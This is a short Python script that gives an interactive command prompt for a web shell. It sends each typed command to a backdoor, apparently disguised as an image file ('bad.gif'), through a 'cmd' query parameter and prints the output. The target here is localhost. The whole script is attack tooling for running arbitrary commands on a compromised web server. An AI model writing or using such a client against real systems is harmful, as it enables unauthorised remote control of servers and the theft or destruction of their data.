#!/usr/bin/env python3
from urllib3 import PoolManager
from termcolor import colored as color
http = PoolManager()
url="http://127.0.0.1/bad.gif?cmd="
print("\n")
while True:
  cmd = input(color(" $","blue"))
  if cmd:
    r = http.request("GET", url+cmd)
    print(color(r.data.decode(), "green"))
  else:
    pass
